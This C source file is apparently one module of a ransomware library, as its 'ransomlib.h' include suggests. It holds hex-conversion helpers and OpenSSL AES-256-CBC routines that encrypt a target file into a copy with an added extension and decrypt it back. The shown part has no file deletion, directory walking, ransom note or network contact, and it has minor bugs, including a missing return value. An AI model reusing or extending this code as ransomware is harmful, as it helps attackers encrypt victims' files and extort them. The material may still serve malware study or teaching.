#include "ransomlib.h"



void handleErrors(void)
{
    ERR_print_errors_fp(stderr);
    abort();
}


int bytes_to_hexa(const unsigned char bytes_string[], char *hex_string, int size)
{
    for (size_t i = 0; i < size; i++) {
        hex_string += sprintf(hex_string, "%.2x", bytes_string[i]);
    }
}

void hexa_to_bytes(char hex_string[], unsigned char val[], int size)
{
    char *pos = hex_string;

    for (size_t count = 0; count < size; count++) {
        sscanf(pos, "%2hhx", &val[count]);
        pos += 2;
    }
}


int encrypt(unsigned char *key, unsigned char *iv, char *plaintext_file)
{
    EVP_CIPHER_CTX *ctx;
    const EVP_CIPHER *cipher_type = EVP_aes_256_cbc();
    int cipher_block_size = EVP_CIPHER_block_size(cipher_type);
    unsigned char in_buf[BUFSIZE], out_buf[BUFSIZE + cipher_block_size];
    int num_bytes_read, out_len;
    int len;

    FILE *fIN = fopen(plaintext_file,"rb");
    if(fIN==NULL)
    {
       handleErrors();
    }
    char encrypted_file[1024];
    snprintf(encrypted_file,sizeof(encrypted_file),"%s.%s",plaintext_file,ENCRYPT_EXT);
    printf("%s\n",encrypted_file);
    FILE *fOUT = fopen(encrypted_file,"wb");
    if(fOUT==NULL)
    {
       handleErrors();
    }
    
    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the encryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be encrypted, and obtain the encrypted output.
     * EVP_EncryptUpdate can be called multiple times if necessary
     */
    num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, fIN);

    while(num_bytes_read > 0)
    {   
    	if(!EVP_EncryptUpdate(ctx, out_buf, &out_len, in_buf, num_bytes_read)){
			handleErrors();}

	fwrite(out_buf, sizeof(unsigned char), out_len, fOUT);
	num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, fIN);

    }
    if(1 != EVP_EncryptFinal_ex(ctx, out_buf, &out_len))
        handleErrors();

    /*
     * Finalise the encryption. Further ciphertext bytes may be written at
     * this stage.
     */

    fwrite(out_buf, sizeof(unsigned char), out_len, fOUT);

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);
   
    fclose(fIN);
    fclose(fOUT);

    return 0;
}


int decrypt(unsigned char *key, unsigned char *iv, char *cipher_file)
{
    EVP_CIPHER_CTX *ctx;
    const EVP_CIPHER *cipher_type = EVP_aes_256_cbc();
    int cipher_block_size = EVP_CIPHER_block_size(cipher_type);
    unsigned char in_buf[BUFSIZE], out_buf[BUFSIZE + cipher_block_size];
    int num_bytes_read, out_len;
    int len;

    FILE *fIN = fopen(cipher_file,"rb");
    if(fIN==NULL)
    {
       handleErrors();
    }
    char plaintext_file[1024];
    snprintf(plaintext_file,strlen(cipher_file)-(EXT_LEN),"%s",cipher_file);
    FILE *fOUT = fopen(plaintext_file,"wb");
    if(fOUT==NULL)
    {
       handleErrors();
    }


    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the decryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be decrypted, and obtain the plaintext output.
     * EVP_DecryptUpdate can be called multiple times if necessary.
     */
    num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, fIN);

    while(num_bytes_read > 0)
    {
        if(!EVP_DecryptUpdate(ctx, out_buf, &out_len, in_buf, num_bytes_read)){
                        handleErrors();}

        fwrite(out_buf, sizeof(unsigned char), out_len, fOUT);
        num_bytes_read = fread(in_buf, sizeof(unsigned char), BUFSIZE, fIN);
 
    }
   if(1 != EVP_DecryptFinal_ex(ctx, out_buf, &out_len))
        handleErrors();

    fwrite(out_buf, sizeof(unsigned char), out_len, fOUT);

    

    /* Clean up */
    fclose(fOUT);
    fclose(fIN);
    EVP_CIPHER_CTX_free(ctx);

    return 0;
}


